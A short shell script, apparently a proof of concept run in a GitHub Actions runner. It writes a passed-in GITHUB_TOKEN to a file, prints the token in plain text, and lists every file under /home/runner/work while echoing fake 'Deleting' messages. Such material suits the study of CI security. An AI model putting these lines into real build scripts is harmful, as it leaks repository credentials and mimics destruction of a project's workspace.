set -e
echo We have access to the file system!
echo $1 > temp.txt
sed -e 's/AUTHORIZATION: basic/[ ---/' temp.txt
echo "Your GITHUB_TOKEN is $1"
cat temp.txt
for i in `ls -R /home/runner/work`; do
  echo "Deleting $i !"
done
